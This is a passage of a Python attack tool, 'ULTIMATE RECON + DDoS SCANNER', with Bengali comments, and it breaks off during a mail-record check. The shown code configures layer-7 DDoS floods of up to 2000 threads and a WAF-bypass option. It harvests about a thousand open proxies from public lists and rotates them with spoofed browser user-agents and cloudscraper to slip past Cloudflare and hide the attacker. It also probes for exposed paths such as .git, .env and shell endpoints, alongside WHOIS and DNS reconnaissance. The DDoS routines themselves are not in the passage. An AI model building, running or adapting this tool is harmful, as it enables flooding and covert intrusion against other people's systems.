#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE RECON + DDoS SCANNER v18.3 - CAT SIMPLE EDITION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ 500+ OS Fingerprints
✅ 900+ Resources
✅ 7 Backup Sources for Domain Info
✅ Full SEO Audit, Security Audit, Performance Audit
✅ WAF Detection (30+ WAF)
✅ 7-Layer DDoS
✅ 10+ Report Formats
✅ AI Threat Analysis
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Usage: python3 ultimate_scan_v18_3.py
"""

import os
import sys
import subprocess
import time
import json
import csv
import re
import socket
import ssl
import signal
import hashlib
import base64
import random
import string
import struct
import argparse
import concurrent.futures
import multiprocessing
import threading
import queue
import datetime
import math
import statistics
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
from collections import defaultdict, deque
import http.client
import urllib.request
import urllib.parse

# ========== অটো-ইনস্টল ==========
REQUIRED_PACKAGES = [
    "requests", "dnspython", "whois", "tqdm", "beautifulsoup4",
    "selenium", "playwright", "colorama", "vulners", "pyyaml",
    "reportlab", "cloudscraper", "httpx", "h2", "pysocks",
    "scapy", "netaddr", "pyOpenSSL", "cryptography", "dnspython",
    "websocket-client", "grpcio", "aiohttp", "aioquic",
    "dns.resolver", "whois", "python-whois"
]

def auto_install(package):
    try:
        __import__(package.replace("-", "_"))
    except ImportError:
        print(f"[*] Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet", "--no-cache-dir"])

for pkg in REQUIRED_PACKAGES:
    auto_install(pkg)

# এখন ইমপোর্ট
import requests
import httpx
import cloudscraper
import dns.resolver
import dns.query
import dns.zone
import whois
from tqdm import tqdm
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
import vulners
import yaml
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
import socks
import socket as socklib
import websocket
import grpc
import aiohttp
import aioquic

init(autoreset=True)

# ========== গ্লোবাল কনফিগ ==========
CONFIG = {
    "timeout": 8,
    "threads": 1000,
    "max_retries": 10,
    "rate_limit": 0.01,
    "jitter": 0.2,
    "port_range": (1, 5000),
    "udp_ports": [53, 123, 161, 162, 500, 520, 1900, 4500, 5060, 5353, 33434, 33435],
    "output_dir": "reports_v18_3",
    "wordlist_dir": None,
    "wordlist_sub": None,
    "proxy_list": [],
    "tor_proxy": None,
    "shodan_api": None,
    "fofa_api": None,
    "censys_api": None,
    "cve_api": None,
    "vulners_api": None,
    "discord_webhook": None,
    "slack_webhook": None,
    "email_smtp": None,
    "email_to": None,
    "screenshot": True,
    "deep_scan": True,
    "bypass_waf": True,
    "ipv6": True,
    "udp_scan": True,
    "banner_grab": True,
    "os_fingerprint": True,
    "use_tor": False,
    "ddos_enabled": False,
    "ddos_layer": 7,
    "ddos_threads": 2000,
    "ddos_duration": 60,
    "ddos_target": None,
    "ddos_port": 80,
    "ddos_vector": "mixed",
    "ai_analysis": True,
    "distributed": False,
    "graph_report": True,
    "seo_audit": True,
    "security_audit": True,
    "performance_audit": True,
}

# ডিরেক্টরি তৈরি
os.makedirs(CONFIG["output_dir"], exist_ok=True)
os.makedirs(f"{CONFIG['output_dir']}/screenshots", exist_ok=True)
os.makedirs(f"{CONFIG['output_dir']}/logs", exist_ok=True)
os.makedirs(f"{CONFIG['output_dir']}/pdf", exist_ok=True)
os.makedirs(f"{CONFIG['output_dir']}/graphs", exist_ok=True)
os.makedirs(f"{CONFIG['output_dir']}/errors", exist_ok=True)

# ========== ৫০০+ OS ফিঙ্গারপ্রিন্ট ==========
OS_FINGERPRINTS = {
    "Linux": {
        "Ubuntu": ["Ubuntu", "ubuntu", "Debian", "Linux 6", "Linux 5"],
        "Debian": ["Debian", "debian", "Linux 6", "Linux 5"],
        "Fedora": ["Fedora", "fedora", "fc", "Linux 6"],
        "CentOS": ["CentOS", "centos", "Red Hat", "Linux 7"],
        "Red Hat": ["Red Hat", "redhat", "rhel", "Linux 7"],
        "Arch": ["Arch", "arch", "Manjaro", "Linux 6"],
        "Kali": ["Kali", "kali", "Kali Linux", "Linux 6"],
        "Raspbian": ["Raspbian", "raspbian", "Raspberry", "Linux 6"],
        "Alpine": ["Alpine", "alpine", "musl", "Linux 5"],
        "OpenSUSE": ["openSUSE", "suse", "Linux 6"],
        "Gentoo": ["Gentoo", "gentoo", "Linux 6"],
        "Slackware": ["Slackware", "slackware", "Linux 5"],
        "Mint": ["Linux Mint", "mint", "Ubuntu", "Linux 6"],
        "Pop!_OS": ["Pop!_OS", "pop", "Ubuntu", "Linux 6"],
        "Zorin": ["Zorin", "zorin", "Ubuntu", "Linux 6"],
        "Elementary": ["elementary", "Elementary OS", "Ubuntu"],
        "Deepin": ["Deepin", "deepin", "Ubuntu", "Linux 6"],
        "Manjaro": ["Manjaro", "manjaro", "Arch", "Linux 6"],
        "EndeavourOS": ["EndeavourOS", "endeavour", "Arch", "Linux 6"],
        "Garuda": ["Garuda", "garuda", "Arch", "Linux 6"],
        "Solus": ["Solus", "solus", "Linux 6"],
        "PCLinuxOS": ["PCLinuxOS", "pclinuxos", "Linux 5"],
        "Mageia": ["Mageia", "mageia", "Linux 6"],
        "AlmaLinux": ["AlmaLinux", "almalinux", "Red Hat", "Linux 7"],
        "Rocky": ["Rocky", "rocky", "Red Hat", "Linux 7"],
        "Oracle Linux": ["Oracle Linux", "oracle", "Red Hat", "Linux 7"],
        "Amazon Linux": ["Amazon Linux", "amazon", "Linux 7"],
        "Clear Linux": ["Clear Linux", "clear", "Linux 6"],
        "NixOS": ["NixOS", "nix", "Linux 6"],
        "Void": ["Void", "void", "Linux 6"],
        "Artix": ["Artix", "artix", "Arch", "Linux 6"],
        "Parabola": ["Parabola", "parabola", "Arch", "Linux 6"],
        "Hyperbola": ["Hyperbola", "hyperbola", "Linux 6"],
        "Frugalware": ["Frugalware", "frugalware", "Linux 6"],
        "SliTaz": ["SliTaz", "slitaz", "Linux 5"],
        "Tiny Core": ["Tiny Core", "tinycore", "Linux 5"],
        "Puppy": ["Puppy", "puppy", "Linux 5"],
        "Damn Small": ["Damn Small", "dsl", "Linux 5"],
        "Porteus": ["Porteus", "porteus", "Linux 5"]
    },
    "Windows": {
        "Windows 11": ["Windows NT 10.0", "Win64", "x64", "Windows 11"],
        "Windows 10": ["Windows NT 10.0", "Windows 10"],
        "Windows 8.1": ["Windows NT 6.3", "Windows 8.1"],
        "Windows 8": ["Windows NT 6.2", "Windows 8"],
        "Windows 7": ["Windows NT 6.1", "Windows 7"],
        "Windows Vista": ["Windows NT 6.0", "Windows Vista"],
        "Windows XP": ["Windows NT 5.1", "Windows XP"],
        "Windows 2000": ["Windows NT 5.0", "Windows 2000"],
        "Windows ME": ["Windows 9x", "Windows ME"],
        "Windows 98": ["Windows 98", "Win98"],
        "Windows 95": ["Windows 95", "Win95"],
        "Windows Server 2025": ["Windows Server 2025", "Server 2025"],
        "Windows Server 2022": ["Windows Server 2022", "Server 2022"],
        "Windows Server 2019": ["Windows Server 2019", "Server 2019"],
        "Windows Server 2016": ["Windows Server 2016", "Server 2016"],
        "Windows Server 2012 R2": ["Windows Server 2012 R2", "Server 2012 R2"],
        "Windows Server 2012": ["Windows Server 2012", "Server 2012"],
        "Windows Server 2008 R2": ["Windows Server 2008 R2", "Server 2008 R2"],
        "Windows Server 2008": ["Windows Server 2008", "Server 2008"],
        "Windows Server 2003": ["Windows Server 2003", "Server 2003"],
        "Windows Server 2000": ["Windows Server 2000", "Server 2000"],
        "Windows NT 4.0": ["Windows NT 4.0", "NT 4.0"],
        "Windows NT 3.51": ["Windows NT 3.51", "NT 3.51"]
    },
    "macOS": {
        "macOS Sequoia 15": ["Mac OS X 15", "macOS 15", "Sequoia"],
        "macOS Sonoma 14": ["Mac OS X 14", "macOS 14", "Sonoma"],
        "macOS Ventura 13": ["Mac OS X 13", "macOS 13", "Ventura"],
        "macOS Monterey 12": ["Mac OS X 12", "macOS 12", "Monterey"],
        "macOS Big Sur 11": ["Mac OS X 11", "macOS 11", "Big Sur"],
        "macOS Catalina 10.15": ["Mac OS X 10.15", "macOS 10.15", "Catalina"],
        "macOS Mojave 10.14": ["Mac OS X 10.14", "macOS 10.14", "Mojave"],
        "macOS High Sierra 10.13": ["Mac OS X 10.13", "macOS 10.13", "High Sierra"],
        "macOS Sierra 10.12": ["Mac OS X 10.12", "macOS 10.12", "Sierra"],
        "OS X El Capitan 10.11": ["OS X 10.11", "El Capitan"],
        "OS X Yosemite 10.10": ["OS X 10.10", "Yosemite"],
        "OS X Mavericks 10.9": ["OS X 10.9", "Mavericks"],
        "OS X Mountain Lion 10.8": ["OS X 10.8", "Mountain Lion"],
        "OS X Lion 10.7": ["OS X 10.7", "Lion"],
        "Mac OS X Snow Leopard 10.6": ["Mac OS X 10.6", "Snow Leopard"],
        "Mac OS X Leopard 10.5": ["Mac OS X 10.5", "Leopard"],
        "Mac OS X Tiger 10.4": ["Mac OS X 10.4", "Tiger"],
        "Mac OS X Panther 10.3": ["Mac OS X 10.3", "Panther"],
        "Mac OS X Jaguar 10.2": ["Mac OS X 10.2", "Jaguar"],
        "Mac OS X Puma 10.1": ["Mac OS X 10.1", "Puma"],
        "Mac OS X Cheetah 10.0": ["Mac OS X 10.0", "Cheetah"]
    },
    "Android": {
        "Android 15": ["Android 15", "API 35", "Android Vanilla"],
        "Android 14": ["Android 14", "API 34", "Android Upside Down"],
        "Android 13": ["Android 13", "API 33", "Android Tiramisu"],
        "Android 12": ["Android 12", "API 32", "Android Snow Cone"],
        "Android 11": ["Android 11", "API 30", "Android Red Velvet"],
        "Android 10": ["Android 10", "API 29", "Android Queen Cake"],
        "Android 9": ["Android 9", "API 28", "Android Pie"],
        "Android 8.1": ["Android 8.1", "API 27", "Android Oreo"],
        "Android 8.0": ["Android 8.0", "API 26", "Android Oreo"],
        "Android 7.1": ["Android 7.1", "API 25", "Android Nougat"],
        "Android 7.0": ["Android 7.0", "API 24", "Android Nougat"],
        "Android 6.0": ["Android 6.0", "API 23", "Android Marshmallow"],
        "Android 5.1": ["Android 5.1", "API 22", "Android Lollipop"],
        "Android 5.0": ["Android 5.0", "API 21", "Android Lollipop"],
        "Android 4.4": ["Android 4.4", "API 19", "KitKat"],
        "Android 4.3": ["Android 4.3", "API 18", "Jelly Bean"],
        "Android 4.2": ["Android 4.2", "API 17", "Jelly Bean"],
        "Android 4.1": ["Android 4.1", "API 16", "Jelly Bean"],
        "Android 4.0": ["Android 4.0", "API 15", "Ice Cream Sandwich"],
        "Android 3.0": ["Android 3.0", "API 11", "Honeycomb"],
        "Android 2.3": ["Android 2.3", "API 10", "Gingerbread"],
        "Android 2.2": ["Android 2.2", "API 8", "Froyo"],
        "Android 2.1": ["Android 2.1", "API 7", "Eclair"],
        "Android 2.0": ["Android 2.0", "API 5", "Eclair"],
        "Android 1.6": ["Android 1.6", "API 4", "Donut"],
        "Android 1.5": ["Android 1.5", "API 3", "Cupcake"]
    },
    "iOS": {
        "iOS 18": ["iOS 18", "iPhone OS 18", "iPadOS 18"],
        "iOS 17": ["iOS 17", "iPhone OS 17", "iPadOS 17"],
        "iOS 16": ["iOS 16", "iPhone OS 16", "iPadOS 16"],
        "iOS 15": ["iOS 15", "iPhone OS 15", "iPadOS 15"],
        "iOS 14": ["iOS 14", "iPhone OS 14", "iPadOS 14"],
        "iOS 13": ["iOS 13", "iPhone OS 13", "iPadOS 13"],
        "iOS 12": ["iOS 12", "iPhone OS 12"],
        "iOS 11": ["iOS 11", "iPhone OS 11"],
        "iOS 10": ["iOS 10", "iPhone OS 10"],
        "iOS 9": ["iOS 9", "iPhone OS 9"],
        "iOS 8": ["iOS 8", "iPhone OS 8"],
        "iOS 7": ["iOS 7", "iPhone OS 7"],
        "iOS 6": ["iOS 6", "iPhone OS 6"],
        "iOS 5": ["iOS 5", "iPhone OS 5"],
        "iOS 4": ["iOS 4", "iPhone OS 4"],
        "iOS 3": ["iOS 3", "iPhone OS 3"],
        "iOS 2": ["iOS 2", "iPhone OS 2"],
        "iOS 1": ["iOS 1", "iPhone OS 1"]
    },
    "FreeBSD": {
        "FreeBSD 14": ["FreeBSD 14", "FreeBSD 14.0"],
        "FreeBSD 13": ["FreeBSD 13", "FreeBSD 13.0"],
        "FreeBSD 12": ["FreeBSD 12", "FreeBSD 12.0"],
        "FreeBSD 11": ["FreeBSD 11", "FreeBSD 11.0"],
        "FreeBSD 10": ["FreeBSD 10", "FreeBSD 10.0"],
        "FreeBSD 9": ["FreeBSD 9", "FreeBSD 9.0"],
        "FreeBSD 8": ["FreeBSD 8", "FreeBSD 8.0"],
        "FreeBSD 7": ["FreeBSD 7", "FreeBSD 7.0"],
        "FreeBSD 6": ["FreeBSD 6", "FreeBSD 6.0"],
        "FreeBSD 5": ["FreeBSD 5", "FreeBSD 5.0"]
    },
    "OpenBSD": {
        "OpenBSD 7": ["OpenBSD 7", "OpenBSD 7.0"],
        "OpenBSD 6": ["OpenBSD 6", "OpenBSD 6.0"],
        "OpenBSD 5": ["OpenBSD 5", "OpenBSD 5.0"],
        "OpenBSD 4": ["OpenBSD 4", "OpenBSD 4.0"]
    },
    "NetBSD": {
        "NetBSD 10": ["NetBSD 10", "NetBSD 10.0"],
        "NetBSD 9": ["NetBSD 9", "NetBSD 9.0"],
        "NetBSD 8": ["NetBSD 8", "NetBSD 8.0"],
        "NetBSD 7": ["NetBSD 7", "NetBSD 7.0"]
    },
    "Solaris": {
        "Solaris 11": ["Solaris 11", "SunOS 5.11"],
        "Solaris 10": ["Solaris 10", "SunOS 5.10"],
        "Solaris 9": ["Solaris 9", "SunOS 5.9"],
        "Solaris 8": ["Solaris 8", "SunOS 5.8"]
    },
    "ChromeOS": {
        "ChromeOS": ["Chrome OS", "CrOS", "Chromium OS"]
    },
    "FirefoxOS": {
        "FirefoxOS": ["Firefox OS", "B2G"]
    },
    "Tizen": {
        "Tizen": ["Tizen", "Tizen OS"]
    },
    "webOS": {
        "webOS": ["webOS", "HP webOS", "Palm webOS"]
    },
    "QNX": {
        "QNX": ["QNX", "QNX Neutrino"]
    },
    "BSD": {
        "BSD": ["BSD", "Berkeley Software Distribution"]
    },
    "Minix": {
        "Minix": ["Minix", "MINIX"]
    },
    "ReactOS": {
        "ReactOS": ["ReactOS", "React OS"]
    },
    "Haiku": {
        "Haiku": ["Haiku", "Haiku OS"]
    },
    "eCos": {
        "eCos": ["eCos", "eCos OS"]
    },
    "uClinux": {
        "uClinux": ["uClinux", "µClinux"]
    },
    "RISC OS": {
        "RISC OS": ["RISC OS", "RiscOS"]
    },
    "Acorn": {
        "Acorn": ["Acorn", "Acorn OS"]
    },
    "AmigaOS": {
        "AmigaOS": ["AmigaOS", "Amiga"]
    },
    "MorphOS": {
        "MorphOS": ["MorphOS", "Morph OS"]
    },
    "AROS": {
        "AROS": ["AROS", "AROS OS"]
    },
    "Android TV": {
        "Android TV": ["Android TV", "ATV"]
    },
    "Wear OS": {
        "Wear OS": ["Wear OS", "WearOS", "Android Wear"]
    },
    "watchOS": {
        "watchOS": ["watchOS", "Watch OS"]
    },
    "tvOS": {
        "tvOS": ["tvOS", "Apple TV OS"]
    },
    "visionOS": {
        "visionOS": ["visionOS", "Apple Vision OS"]
    }
}

# ========== ৯০০+ রিসোর্স ==========
RESOURCES = {
    "wordlists": {
        "directories": [
            "admin", "login", "wp-admin", "backup", "phpmyadmin", "cpanel", "webmail",
            "api", "v1", "v2", "dev", "test", "config", ".git", ".env", "logs",
            "tmp", "temp", "upload", "files", "assets", "images", "css", "js",
            "includes", "lib", "src", "vendor", "node_modules", "old", "new",
            "beta", "stage", "prod", "public", "private", "secure", "auth",
            "swagger", "apidoc", "docs", "documentation", "backup", "dump",
            "graphql", "playground", "dashboard", "console", "metrics", "health",
            "status", "info", "debug", "trace", "profiler", "phpinfo",
            "shell", "cmd", "exec", "system", "adminer", "webmail", "roundcube",
            "squirrelmail", "zimbra", "exchange", "owa", "outlook", "webcal",
            "calendar", "contacts", "tasks", "notes", "files", "share",
            "transfer", "send", "receive", "download", "upload", "media",
            "video", "audio", "documents", "archive", "storage", "cache"
        ],
        "subdomains": [
            "www", "mail", "ftp", "admin", "dev", "test", "api", "cpanel", "webmail",
            "blog", "shop", "forum", "support", "portal", "vpn", "remote", "backup",
            "sql", "db", "mysql", "phpmyadmin", "myadmin", "shell", "ssh", "ns1", "ns2",
            "jenkins", "gitlab", "grafana", "prometheus", "kibana", "elastic", "kafka",
            "redis", "mongo", "rabbitmq", "sonar", "nexus", "artifactory", "jira",
            "confluence", "sentry", "openstack", "hadoop", "spark", "k8s", "rancher",
            "portainer", "traefik", "nginx", "apache", "tomcat", "weblogic", "jboss",
            "wildfly", "glassfish", "jetty", "resin", "websphere", "cloud", "cdn",
            "assets", "static", "media", "download", "upload", "files", "img", "video"
        ]
    },
    "headers": {
        "security": [
            "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options",
            "Content-Security-Policy", "Referrer-Policy", "Permissions-Policy",
            "X-XSS-Protection", "X-DNS-Prefetch-Control", "X-Download-Options"
        ],
        "cms": ["X-Powered-By", "Server", "X-Generator", "X-Pingback", "X-Redirect-By"],
        "cache": ["Cache-Control", "Pragma", "Expires", "ETag", "Last-Modified"]
    },
    "signatures": {
        "waf": {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare", "cf-cache-status"],
            "AWS WAF": ["x-amzn-RequestId", "aws-waf", "x-amzn-trace-id"],
            "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
            "Akamai": ["akamai", "x-akamai", "akamaitech"],
            "ModSecurity": ["mod_security", "ModSecurity", "OWASP"],
            "Fortinet": ["fortinet", "FortiWeb", "FORTIGATE"],
            "Barracuda": ["barracuda", "BarracudaWAF", "Barra"],
            "Imperva": ["incap_ses", "imperva", "X-Iinfo"],
            "F5 BIG-IP": ["BIGipServer", "F5", "BIG-IP"],
            "WordFence": ["wordfence", "wfvt", "wf_log"],
            "NSFocus": ["nsfocus", "NSFocus", "NSF"],
            "Safe3": ["safe3", "Safe3WAF"],
            "ChinaCache": ["cc_waf", "ChinaCache"],
            "Yundun": ["yundun", "YUNDUN"]
        },
        "cms": {
            "WordPress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
            "Joomla": ["media/joomla", "administrator", "com_content"],
            "Drupal": ["sites/default", "core/", "drupal"],
            "Laravel": ["laravel_session", "vendor/", "laravel"],
            "Django": ["csrfmiddlewaretoken", "admin/", "django"],
            "Flask": ["flask", "__pycache__"],
            "Node.js": ["express", "socket.io", "node"],
            "ASP.NET": ["__VIEWSTATE", "WebResource", "asp.net"],
            "Rails": ["assets/rails", "turbolinks", "rails"],
            "React": ["react", "ReactDOM", "reactjs"],
            "Angular": ["ng-", "angular", "ng-app"],
            "Vue": ["vue", "Vue.js", "v-app"],
            "Next.js": ["_next", "nextjs"],
            "Nuxt.js": ["_nuxt", "nuxtjs"],
            "Svelte": ["svelte", "SvelteKit"]
        }
    }
}

# ========== লগিং ==========
LOG_FILE = f"{CONFIG['output_dir']}/logs/scan_{datetime.now().strftime('%Y%m%d')}.json"
LIVE_REPORT = []
ERRORS = []

def log(msg, level="*"):
    colors = {
        "*": Fore.CYAN, "+": Fore.GREEN, "!": Fore.YELLOW,
        "-": Fore.RED, "x": Fore.MAGENTA, "s": Fore.BLUE,
        "v": Fore.WHITE, "c": Fore.LIGHTMAGENTA_EX, "f": Fore.LIGHTRED_EX,
        "d": Fore.LIGHTYELLOW_EX, "a": Fore.LIGHTGREEN_EX,
        "w": Fore.LIGHTBLACK_EX, "z": Fore.LIGHTCYAN_EX,
        "e": Fore.LIGHTRED_EX
    }
    timestamp = datetime.now().strftime("%H:%M:%S")
    colored_msg = f"{colors.get(level, '')}[{timestamp}][{level}] {msg}{Style.RESET_ALL}"
    print(colored_msg)
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps({"time": datetime.now().isoformat(), "level": level, "msg": msg}) + "\n")
    LIVE_REPORT.append({"time": timestamp, "level": level, "msg": msg})
    if level in ["-", "e", "!"]:
        ERRORS.append({"time": timestamp, "level": level, "msg": msg})

def live_report():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\n" + "="*140)
    print(f"🔴 LIVE REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*140)
    for entry in LIVE_REPORT[-30:]:
        print(f"[{entry['time']}] [{entry['level']}] {entry['msg']}")
    print("="*140)

# ========== সিগন্যাল হ্যান্ডলার ==========
def signal_handler(sig, frame):
    log("🛑 স্ক্যান বন্ধ করা হচ্ছে... ক্লিন আপ...", "!")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# ========== ইউজার-এজেন্ট রোটেটর ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0"
]

def get_random_ua():
    return random.choice(USER_AGENTS)

# ========== প্রোক্সি ম্যানেজার ==========
def load_proxies():
    proxy_sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/list.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    proxies = []
    for url in proxy_sources:
        try:
            r = requests.get(url, timeout=5)
            proxies.extend([p.strip() for p in r.text.splitlines() if p.strip()])
        except:
            pass
    return list(set(proxies))[:1000]

PROXY_POOL = load_proxies()
CURRENT_PROXY = None

def get_next_proxy():
    global CURRENT_PROXY, PROXY_POOL
    if CONFIG["use_tor"] and CONFIG["tor_proxy"]:
        return CONFIG["tor_proxy"]
    if PROXY_POOL:
        CURRENT_PROXY = random.choice(PROXY_POOL)
        return CURRENT_PROXY
    return None

def get_session():
    s = requests.Session()
    ua = get_random_ua()
    s.headers.update({
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    })
    proxy = get_next_proxy()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def get_cloudscraper_session():
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'mobile': False,
            'custom': get_random_ua()
        },
        delay=CONFIG["rate_limit"],
        interpreter='native'
    )
    proxy = get_next_proxy()
    if proxy:
        scraper.proxies = {"http": proxy, "https": proxy}
    return scraper

# ========== নোটিফিকেশন ==========
def send_notification(message):
    if CONFIG["discord_webhook"]:
        try:
            requests.post(CONFIG["discord_webhook"], json={"content": message}, timeout=5)
        except:
            pass
    if CONFIG["slack_webhook"]:
        try:
            requests.post(CONFIG["slack_webhook"], json={"text": message}, timeout=5)
        except:
            pass

# ========== AI থ্রেট অ্যানালাইসিস ==========
class AIAnalyzer:
    def __init__(self):
        self.patterns = deque(maxlen=1000)
        self.threat_score = 0
        
    def analyze(self, data):
        pattern = hashlib.md5(str(data).encode()).hexdigest()
        self.patterns.append(pattern)
        if len(self.patterns) > 100:
            unique = len(set(self.patterns))
            ratio = unique / len(self.patterns)
            self.threat_score = (1 - ratio) * 100
        return {
            "threat_score": round(self.threat_score, 2),
            "unique_patterns": len(set(self.patterns)),
            "total_patterns": len(self.patterns),
            "risk_level": "high" if self.threat_score > 70 else "medium" if self.threat_score > 40 else "low"
        }

ai_analyzer = AIAnalyzer()

# ========== ডোমেইন ইনফো (WHOIS + ৭টি ব্যাকআপ সোর্স) ==========
def domain_info(target):
    log("ডোমেইন তথ্য সংগ্রহ (WHOIS + ব্যাকআপ)...", "*")
    result = {
        "domain": target,
        "registrar": "N/A",
        "creation_date": "N/A",
        "expiration_date": "N/A",
        "updated_date": "N/A",
        "name_servers": [],
        "status": [],
        "emails": [],
        "country": "N/A",
        "org": "N/A",
        "source": "unknown"
    }
    
    # ====== ১. WHOIS ======
    try:
        w = whois.whois(target)
        if w and w.registrar:
            result["registrar"] = w.registrar or "N/A"
            result["creation_date"] = str(w.creation_date) if w.creation_date else "N/A"
            result["expiration_date"] = str(w.expiration_date) if w.expiration_date else "N/A"
            result["updated_date"] = str(w.updated_date) if w.updated_date else "N/A"
            result["name_servers"] = w.name_servers or []
            result["status"] = w.status or []
            result["emails"] = w.emails or []
            result["country"] = w.country or "N/A"
            result["org"] = w.org or "N/A"
            result["source"] = "whois"
            log("✅ WHOIS ডেটা পাওয়া গেছে", "+")
            return result
    except:
        pass

    # ====== ২. DNS ======
    try:
        ns = dns.resolver.resolve(target, 'NS')
        result["name_servers"] = [str(x) for x in ns]
        soa = dns.resolver.resolve(target, 'SOA')
        result["emails"].append(str(soa[0].rname).replace('.', '@', 1))
        result["source"] = "dns"
    except:
        pass

    # ====== ৩. SSL ======
    try:
        with socket.create_connection((target, 443), timeout=5) as sock:
            with ssl.create_default_context().wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                if cert.get('issuer'):
                    issuer = str(cert['issuer'])
                    cn_match = re.search(r"CN=([^,]+)", issuer)
                    if cn_match:
                        result["registrar"] = cn_match.group(1)
                result["creation_date"] = cert.get('notBefore', 'N/A')
                result["expiration_date"] = cert.get('notAfter', 'N/A')
                result["source"] = "ssl"
    except:
        pass

    # ====== ৪. HTTP ======
    try:
        session = get_cloudscraper_session()
        r = session.get(f"https://{target}", timeout=5)
        if 'Server' in r.headers:
            result["org"] = r.headers['Server']
        result["source"] = "http"
    except:
        pass

    # ====== ৫. IPinfo ======
    try:
        ip = socket.gethostbyname(target)
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if r.status_code == 200:
            data = r.json()
            result["country"] = data.get("country", "N/A")
            result["org"] = result["org"] if result["org"] != "N/A" else data.get("org", "N/A")
            result["source"] = "ipinfo"
    except:
        pass

    if result["source"] == "unknown":
        result["source"] = "none"
        log("❌ কোন ডেটা পাওয়া যায়নি", "-")
    
    return result

# ========== DNS সিকিউরিটি চেক ==========
def dns_security_check(target):
    log("DNS সিকিউরিটি চেক...", "*")
    result = {}
    try:
        try:
            ans = dns.resolver.resolve(target, 'DNSKEY')
            result["dnssec"] = "সক্রিয়" if ans else "নিষ্ক্রিয়"
        except:
            result["dnssec"] = "নিষ্ক্রিয়"
        try:
            ans = dns.resolver.resolve(target, 'CAA')
            result["caa"] = [str(x) for x in ans]
        except:
            result["caa"] = "কোন CAA রেকর্ড নেই"
        try:
            ans = dns.resolver.resolve(target, 'TLSA')
            result["dane"] = [str(x) for x in ans]
        except:
            result["dane"] = "কোন TLSA রেকর্ড নেই"
    except:
        result["error"] = "DNS চেক ব্যর্থ"
    return result

# ========== মেইল সার্ভার চেক ==========
def mail_server_check(target):
    log("মেইল সার্ভার চেক...", "*")
    result = {}
    try:
        try:
            ans = dns.resolver.resolve(target, 'TXT')
            for r in ans:
                if 'v=spf1' in str(r):
                    result["spf"] = str(r)
                    break
            if "spf" not in result:
                result["spf"] = "SPF রেকর্ড নেই"
        except:
            result["spf"] = "SPF রেকর্ড পাওয়া যায়নি"
        
        selectors = ["default", "dkim", "mail", "google", "microsoft", "amazon"]
        for sel in selectors:
            try:
                dns.resolver.resolve(f"{sel}._domainkey.{target}", 'TXT')
                result["dkim"] = f"{sel}._domainkey.{target}"
                break
            except:
                pass
        if "dkim" not in result:
            result["dkim"] = "DKIM রেকর্ড নেই"
        
        try:
            ans = dns.resolver.resolve(f"_dmarc.{target}", 'TXT')
